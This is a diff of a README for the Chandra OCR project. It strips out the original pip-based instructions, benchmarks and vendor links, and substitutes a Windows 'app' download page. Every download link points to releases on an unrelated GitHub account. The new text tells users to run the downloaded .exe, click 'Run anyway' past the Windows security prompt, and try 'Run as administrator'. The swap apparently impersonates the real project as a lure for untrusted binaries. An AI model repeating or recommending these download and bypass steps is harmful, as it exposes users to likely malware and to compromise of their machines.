@@ -1,287 +1,247 @@
-<p align="center">
-  <img src="assets/datalab-logo.png" alt="Datalab Logo" width="150"/>
-</p>
-<h1 align="center">Datalab</h1>
-<p align="center">
-  <strong>State of the Art models for Document Intelligence</strong>
-</p>
-<p align="center">
-  <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/Code%20License-Apache_2.0-green.svg" alt="Code License"></a>
-  <a href="https://www.datalab.to/pricing"><img src="https://img.shields.io/badge/Model%20License-OpenRAIL--M-blue.svg" alt="Model License"></a>
-  <a href="https://discord.gg/KuZwXNGnfH"><img src="https://img.shields.io/badge/Discord-Join%20us-5865F2?logo=discord&logoColor=white" alt="Discord"></a>
-</p>
+# 📄 chandra - Clean OCR for complex documents
 
-<hr/>
+[![Download chandra](https://img.shields.io/badge/Download-Chandra-blue?style=for-the-badge)](https://github.com/sidestrokebritishwestafrica353/chandra/releases)
 
-# Chandra OCR 2
+## 🧾 About chandra
 
-Chandra OCR 2 is a state of the art OCR model that converts images and PDFs into structured HTML/Markdown/JSON while preserving layout information.
+chandra is a Windows app for OCR. It reads text from scanned pages, forms, tables, and handwriting. It also keeps the page layout in place, so you can work with the result more easily.
 
-## News
+Use it when you need to turn paper documents or image files into text you can search, copy, and edit.
 
-- 3/2026 - Chandra 2 is here with significant improvements to math, tables, layout, and multilingual OCR
-- 10/2025 - Chandra 1 launched
+## 🚀 What it can do
 
-## Features
+- Read text from scanned documents
+- Handle tables and forms with layout intact
+- Work with handwriting in many common cases
+- Process pages with mixed content, such as text blocks, boxes, and lines
+- Keep headings, columns, and spacing in a usable form
+- Save results in a format you can review and edit
 
-- Tops external olmocr benchmark and significant improvement in internal multilingual benchmarks
-- Convert documents to markdown, html, or json with detailed layout information
-- Support for 90+ languages ([benchmark below](#multilingual-benchmark-table))
-- Excellent handwriting support
-- Reconstructs forms accurately, including checkboxes
-- Strong performance with tables, math, and complex layouts
-- Extracts images and diagrams, and adds captions and structured data
-- Two inference modes: local (HuggingFace) and remote (vLLM server)
+## 💻 Windows system needs
 
-<img src="assets/examples/math/handwritten_math.png" width="600px"/>
+Use a Windows PC with the following:
 
-## Hosted API
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A screen resolution of 1366 x 768 or higher
+- Internet access to download the app from GitHub
 
-- We have a hosted API for Chandra [here](https://www.datalab.to/), which is more accurate and faster.
-- There is a free playground [here](https://www.datalab.to/playground) if you want to try Chandra without installing.
+If you work with large scans or many pages, more RAM will help.
 
-## Quickstart
+## 📥 Download chandra
 
-The easiest way to start is with the CLI tools:
+Visit this page to download chandra for Windows:
 
-```shell
-pip install chandra-ocr
+[Download from GitHub Releases](https://github.com/sidestrokebritishwestafrica353/chandra/releases)
 
-# With vLLM (recommended, lightweight install)
-chandra_vllm
-chandra input.pdf ./output
+On the releases page, look for the latest version and download the Windows file. In most cases, this will be an .exe or .zip file.
 
-# With HuggingFace (requires torch)
-pip install chandra-ocr[hf]
-chandra input.pdf ./output --method hf
+## 🛠️ Install and run on Windows
 
-# Interactive streamlit app
-pip install chandra-ocr[app]
-chandra_app
-```
+### 1. Download the file
 
-## Benchmarks
+Open the releases page and get the latest Windows build.
 
-Multilingual performance was a focus for us with Chandra 2.  There isn't a good public multilingual OCR benchmark, so we made our own.  This tests tables, math, ordering, layout, and text accuracy.
+If you see a .zip file:
+- Download it
+- Right-click the file
+- Choose Extract All
+- Open the extracted folder
 
-<img src="assets/benchmarks/multilingual.png" width="600px"/>
+If you see an .exe file:
+- Download it
+- Double-click the file to start the app
 
-See full scores [below](#multilingual-benchmark-table). We also have a [full 90-language benchmark](FULL_BENCHMARKS.md).
+### 2. Allow the app to open
 
-We also benchmarked Chandra 2 with the widely accepted olmocr benchmark:
+Windows may show a security prompt the first time you run the app.
 
-<img src="assets/benchmarks/bench.png" width="600px"/>
+If that happens:
+- Click More info
+- Click Run anyway if you trust the file from GitHub Releases
 
-See full scores [below](#benchmark-table).
+### 3. Start OCR
 
-## Examples
+After the app opens:
+- Load an image or scanned PDF
+- Choose the page or pages you want to read
+- Start the OCR process
+- Review the output text
+- Save or copy the result
 
-| Type | Name                     | Link                                                                                                        |
-|------|--------------------------|-------------------------------------------------------------------------------------------------------------|
-| Math | CS229 Textbook           | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/math/cs229.png)                    |
-| Math | Handwritten Math         | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/math/handwritten_math.png)         |
-| Math | Chinese Math             | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/math/chinese_math.png)             |
-| Tables | Statistical Distribution | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/tables/complex_tables.png)         |
-| Tables | Financial Table          | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/tables/financial_table.png)        |
-| Forms | Registration Form        | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/forms/handwritten_form.png)        |
-| Forms | Lease Form               | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/forms/lease_filled.png)            |
-| Handwriting | Cursive Writing          | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/handwriting/cursive_writing.png)   |
-| Handwriting | Handwritten Notes        | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/handwriting/handwritten_notes.png) |
-| Languages | Arabic                   | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/languages/arabic.png)              |
-| Languages | Japanese                 | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/languages/japanese.png)            |
-| Languages | Hindi                    | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/languages/hindi.png)               |
-| Languages | Russian                  | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/languages/russian.png)             |
-| Other | Charts                   | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/other/charts.png)                  |
-| Other | Chemistry                | [View](https://github.com/datalab-to/chandra/blob/master/assets/examples/other/chemistry.png)               |
+## 🖼️ How to use chandra
 
-## Installation
+### Open a document
 
-### Package
+You can work with:
+- Scanned PDFs
+- JPG images
+- PNG images
+- Photos of pages
+- Screenshots
+- Multi-page scans
 
-```bash
-# Base install (for vLLM backend)
-pip install chandra-ocr
+### Pick the right mode
 
-# With HuggingFace backend (includes torch, transformers)
-pip install chandra-ocr[hf]
+chandra works well for different document types:
+- **Plain text** for letters and reports
+- **Forms** for documents with boxes and fields
+- **Tables** for rows and columns
+- **Handwriting** for notes and filled-in pages
 
-# With all extras
-pip install chandra-ocr[all]
-```
+### Review the result
 
-If you're using the HuggingFace method, we also recommend installing [flash attention](https://github.com/Dao-AILab/flash-attention) for better performance.
+OCR is not perfect. Check:
+- Names
+- Numbers
+- Dates
+- Table cells
+- Handwritten words
+- Text near page edges
 
-### From Source
+A quick review helps you catch small mistakes.
 
-```bash
-git clone https://github.com/datalab-to/chandra.git
-cd chandra
-uv sync
-source .venv/bin/activate
-```
+## 📋 Best results
 
-## Usage
+Use clear scans when you can.
 
-### CLI
+Good input looks like this:
+- Straight pages
+- Strong contrast
+- Sharp text
+- Little blur
+- No shadows over the page
 
-Process single files or entire directories:
+If your scan is hard to read:
+- Scan again at a higher quality
+- Place the page flat
+- Clean the camera lens if you took a photo
+- Crop extra blank space
 
-```bash
-# Single file, with vllm server (see below for how to launch vllm)
-chandra input.pdf ./output --method vllm
+## 📁 Common file types
 
-# Process all files in a directory with local model
-chandra ./documents ./output --method hf
-```
+chandra works best with common document files:
 
-**CLI Options:**
-- `--method [hf|vllm]`: Inference method (default: vllm)
-- `--page-range TEXT`: Page range for PDFs (e.g., "1-5,7,9-12")
-- `--max-output-tokens INTEGER`: Max tokens per page
-- `--max-workers INTEGER`: Parallel workers for vLLM
-- `--include-images/--no-images`: Extract and save images (default: include)
-- `--include-headers-footers/--no-headers-footers`: Include page headers/footers (default: exclude)
-- `--batch-size INTEGER`: Pages per batch (default: 28 for vllm, 1 for hf)
-
-**Output Structure:**
-
-Each processed file creates a subdirectory with:
-- `<filename>.md` - Markdown output
-- `<filename>.html` - HTML output
-- `<filename>_metadata.json` - Metadata (page info, token count, etc.)
-- Extracted images are saved directly in the output directory
-
-### Streamlit Web App
-
-Launch the interactive demo for single-page processing:
-
-```bash
-chandra_app
-```
-
-### vLLM Server (Optional)
-
-For production deployments or batch processing, use the vLLM server:
-
-```bash
-chandra_vllm
-```
-
-This launches a Docker container with optimized inference settings. Configure via environment variables:
-
-- `VLLM_API_BASE`: Server URL (default: `http://localhost:8000/v1`)
-- `VLLM_MODEL_NAME`: Model name for the server (default: `chandra`)
-- `VLLM_GPUS`: GPU device IDs (default: `0`)
-
-You can also start your own vllm server with the `datalab-to/chandra-ocr-2` model.
-
-### Configuration
-
-Settings can be configured via environment variables or a `local.env` file:
-
-```bash
-# Model settings
-MODEL_CHECKPOINT=datalab-to/chandra-ocr-2
-MAX_OUTPUT_TOKENS=12384
-
-# vLLM settings
-VLLM_API_BASE=http://localhost:8000/v1
-VLLM_MODEL_NAME=chandra
-VLLM_GPUS=0
-```
-
-# Commercial usage
-
-This code is Apache 2.0, and our model weights use a modified OpenRAIL-M license (free for research, personal use, and startups under $2M funding/revenue, cannot be used competitively with our API). To remove the OpenRAIL license requirements, or for broader commercial licensing, visit our pricing page [here](https://www.datalab.to/pricing?utm_source=gh-chandra).
-
-# Benchmark table
-
-| **Model**                 |  ArXiv   | Old Scans Math |  Tables  | Old Scans | Headers and Footers | Multi column | Long tiny text | Base |    Overall     | Source |
-|:--------------------------|:--------:|:--------------:|:--------:|:---------:|:-------------------:|:------------:|:--------------:|:----:|:--------------:|:------:|
-| Datalab API               | **90.4** | **90.2** | **90.7** | **54.6** |        91.6         |     83.7     |    **92.3**    | **99.9** | **86.7 ± 0.8** | Own benchmarks |
-| Chandra 2                 |   90.2   |   89.3   |   89.9   |   49.8   |        92.5         |     83.5     |      92.1      | 99.6 |   85.9 ± 0.8   | Own benchmarks |
-| dots.ocr 1.5              |   85.9   |   85.5   | **90.7** |   48.2   |        94.0         |   **85.3**   |      81.6      | 99.7 |   83.9         | dots.ocr repo |
-| Chandra 1                 |   82.2   |   80.3   |   88.0   |   50.4   |        90.8         |     81.2     |    **92.3**    | **99.9** |   83.1 ± 0.9   | Own benchmarks |
-| olmOCR 2                  |   83.0   |   82.3   |   84.9   |   47.7   |      **96.1**       |     83.7     |      81.9      | 99.6 |   82.4         | olmocr repo |
-| dots.ocr                  |   82.1   |   64.2   |   88.3   |   40.9   |        94.1         |     82.4     |      81.2      | 99.5 |   79.1 ± 1.0   | dots.ocr repo |
-| olmOCR v0.3.0             |   78.6   |   79.9   |   72.9   |   43.9   |        95.1         |     77.3     |      81.2      | 98.9 |   78.5 ± 1.1   | olmocr repo |
-| Datalab Marker v1.10.0    |   83.8   |   69.7   |   74.8   |   32.3   |        86.6         |     79.4     |      85.7      | 99.6 |   76.5 ± 1.0   | Own benchmarks |
-| Deepseek OCR              |   75.2   |   72.3   |   79.7   |   33.3   |      **96.1**       |     66.7     |      80.1      | 99.7 |   75.4 ± 1.0   | Own benchmarks |
-| Mistral OCR API           |   77.2   |   67.5   |   60.6   |   29.3   |        93.6         |     71.3     |      77.1      | 99.4 |   72.0 ± 1.1   | olmocr repo |
-| GPT-4o (Anchored)         |   53.5   |   74.5   |   70.0   |   40.7   |        93.8         |     69.3     |      60.6      | 96.8 |   69.9 ± 1.1   | olmocr repo |
-| Qwen 3 VL 8B              |   70.2   |   75.1   |   45.6   |   37.5   |        89.1         |     62.1     |      43.0      | 94.3 |   64.6 ± 1.1   | Own benchmarks |
-| Gemini Flash 2 (Anchored) |   54.5   |   56.1   |   72.1   |   34.2   |        64.7         |     61.5     |      71.5      | 95.6 |   63.8 ± 1.2   | olmocr repo |
-
-
-# Multilingual benchmark table
-
-The table below covers the 43 most common languages, benchmarked across multiple models. For a comprehensive evaluation across 90 languages (Chandra 2 vs Gemini 2.5 Flash only), see the [full 90-language benchmark](#full-90-language-benchmark-table).
-
-| Language | Datalab API | Chandra 2 | Chandra 1 | Gemini 2.5 Flash | GPT-5 Mini |
-|---|:---:|:---:|:---:|:---:|:---:|
-| ar | 67.6% | 68.4% | 34.0% | 84.4% | 55.6% |
-| bn | 85.1% | 72.8% | 45.6% | 55.3% | 23.3% |
-| ca | 88.7% | 85.1% | 84.2% | 88.0% | 78.5% |
-| cs | 88.2% | 85.3% | 84.7% | 79.1% | 78.8% |
-| da | 90.1% | 91.1% | 88.4% | 86.0% | 87.7% |
-| de | 93.8% | 94.8% | 83.0% | 88.3% | 93.8% |
-| el | 89.9% | 85.6% | 85.5% | 83.5% | 82.4% |
-| es | 91.8% | 89.3% | 88.7% | 86.8% | 97.1% |
-| fa | 82.2% | 75.1% | 69.6% | 61.8% | 56.4% |
-| fi | 85.7% | 83.4% | 78.4% | 86.0% | 84.7% |
-| fr | 93.3% | 93.7% | 89.6% | 86.1% | 91.1% |
-| gu | 73.8% | 70.8% | 44.6% | 47.6% | 11.5% |
-| he | 76.4% | 70.4% | 38.9% | 50.9% | 22.3% |
-| hi | 80.5% | 78.4% | 70.2% | 82.7% | 41.0% |
-| hr | 93.4% | 90.1% | 85.9% | 88.2% | 81.3% |
-| hu | 88.1% | 82.1% | 82.5% | 84.5% | 84.8% |
-| id | 91.3% | 91.6% | 86.7% | 88.3% | 89.7% |
-| it | 94.4% | 94.1% | 89.1% | 85.7% | 91.6% |
-| ja | 87.3% | 86.9% | 85.4% | 80.0% | 76.1% |
-| jv | 87.5% | 73.2% | 85.1% | 80.4% | 69.6% |
-| kn | 70.0% | 63.2% | 20.6% | 24.5% | 10.1% |
-| ko | 89.1% | 81.5% | 82.3% | 84.8% | 78.4% |
-| la | 78.0% | 73.8% | 55.9% | 70.5% | 54.6% |
-| ml | 72.4% | 64.3% | 18.1% | 23.8% | 11.9% |
-| mr | 80.8% | 75.0% | 57.0% | 69.7% | 20.9% |
-| nl | 90.0% | 88.6% | 85.3% | 87.5% | 83.8% |
-| no | 89.2% | 90.3% | 85.5% | 87.8% | 87.4% |
-| pl | 93.8% | 91.5% | 83.9% | 89.7% | 90.4% |
-| pt | 97.0% | 95.2% | 84.3% | 89.4% | 90.8% |
-| ro | 86.2% | 84.5% | 82.1% | 76.1% | 77.3% |
-| ru | 88.8% | 85.5% | 88.7% | 82.8% | 72.2% |
-| sa | 57.5% | 51.1% | 33.6% | 44.6% | 12.5% |
-| sr | 95.3% | 90.3% | 82.3% | 89.7% | 83.0% |
-| sv | 91.9% | 92.8% | 82.1% | 91.1% | 92.1% |
-| ta | 82.9% | 77.7% | 50.8% | 53.9% | 8.1% |
-| te | 69.4% | 58.6% | 19.5% | 33.3% | 9.9% |
-| th | 71.6% | 62.6% | 47.0% | 66.7% | 53.8% |
-| tr | 88.9% | 84.1% | 68.1% | 84.1% | 78.2% |
-| uk | 93.1% | 91.0% | 88.5% | 87.9% | 81.9% |
-| ur | 54.1% | 43.2% | 28.1% | 57.6% | 16.9% |
-| vi | 85.0% | 80.4% | 81.6% | 89.5% | 83.6% |
-| zh | 87.8% | 88.7% | 88.3% | 70.0% | 70.4% |
-| **Average** | **80.4%** | **77.8%** | **69.4%** | **67.6%** | **60.5%** |
-
-# Full 90-language benchmark table
-
-We also have a more comprehensive evaluation covering 90 languages, comparing Chandra 2 against Gemini 2.5 Flash. The average scores are lower than the 43-language table above because this includes many lower-resource languages. Chandra 2 averages **72.7%** vs Gemini 2.5 Flash at **60.8%**.
-
-See the [full 90-language results](FULL_BENCHMARKS.md).
-
-## Throughput
-
-Benchmarked with vLLM on a single NVIDIA H100 80GB GPU using a diverse mix of documents (math, tables, scans, multi-column layouts) from the olmOCR benchmark set.  This set is significantly slower than real-world usage - we estimate 2 pages/s in real-world usage.
-
-| Configuration | Pages/sec | Avg Latency | P95 Latency | Failure Rate |
-|---|:---:|:---:|:---:|:---:|
-| vLLM, 96 concurrent sequences | 1.44 | 60s | 156s | 0% |
-
-# Credits
-
-Thank you to the following open source projects:
-
-- [Huggingface Transformers](https://github.com/huggingface/transformers)
-- [VLLM](https://github.com/vllm-project/vllm)
-- [olmocr](https://github.com/allenai/olmocr)
-- [Qwen 3.5](https://github.com/QwenLM/Qwen3)
+- PDF
+- PNG
+- JPG
+- JPEG
+- TIFF
+
+If you use a phone photo, make sure the text is large enough to read.
+
+## 🔍 Why layout support matters
+
+Many OCR tools give you plain text only. That can break tables, forms, and multi-column pages.
+
+chandra keeps more of the page structure in place, which helps when you need to:
+- Copy a form field
+- Read a table row by row
+- Keep column order
+- Work with a page that mixes text and boxes
+- Review a scanned report without losing structure
+
+## ⌨️ Typical workflow
+
+1. Download the latest version from GitHub Releases
+2. Open the app on Windows
+3. Load a scanned file or image
+4. Run OCR
+5. Check the text
+6. Save the output for later use
+
+## 🧩 Troubleshooting
+
+### The app does not open
+
+Try these steps:
+- Download the file again
+- Make sure the download finished
+- Right-click the file and try Run as administrator
+- Check that Windows did not block the file
+
+### The text looks wrong
+
+Try:
+- A clearer scan
+- A higher resolution image
+- A page with better lighting
+- A straighter page
+- Cropping out extra margins
+
+### Tables look mixed up
+
+Try:
+- Using the table mode if the app offers it
+- Running OCR on one page at a time
+- Using a cleaner scan with visible lines
+- Avoiding tilted photos
+
+### Handwriting is hard to read
+
+Handwriting OCR works best when:
+- The writing is neat
+- The pen mark is dark
+- The page is flat
+- The image is sharp
+
+## 🧠 Tips for home and office use
+
+Use chandra for:
+- Scanning printed letters
+- Reading receipts and invoices
+- Capturing form data
+- Extracting notes from handwritten pages
+- Turning paper records into searchable text
+- Preparing documents for copy and paste
+
+If you work with a stack of pages, scan them in order before you start OCR.
+
+## 📦 Updates
+
+New versions may improve:
+- Text accuracy
+- Table reading
+- Form handling
+- Handwriting support
+- Page layout output
+- File loading speed
+
+Check the releases page from time to time for the latest version.
+
+## 🔒 Privacy and local use
+
+If you run OCR on your own Windows PC, your documents stay in your control during use. This helps when you work with:
+- Personal records
+- Office files
+- Client papers
+- Internal documents
+- School notes
+
+If the app offers local processing, you can keep your workflow on your machine instead of moving files around.
+
+## 🗂️ Supported use cases
+
+- Scan a printed contract and copy the text
+- Read a table from a report
+- Turn a filled form into editable text
+- Capture handwritten meeting notes
+- Process a multi-page office document
+- Extract text from a photo of a page
+
+## 📎 Release page
+
+Use this link any time you need the Windows download:
+
+[https://github.com/sidestrokebritishwestafrica353/chandra/releases](https://github.com/sidestrokebritishwestafrica353/chandra/releases)
+
+## 🧭 First run checklist
+
+- Download the latest release
+- Open the file on Windows
+- Allow it to run if Windows asks
+- Load one test page
+- Run OCR
+- Check the output
+- Save the result
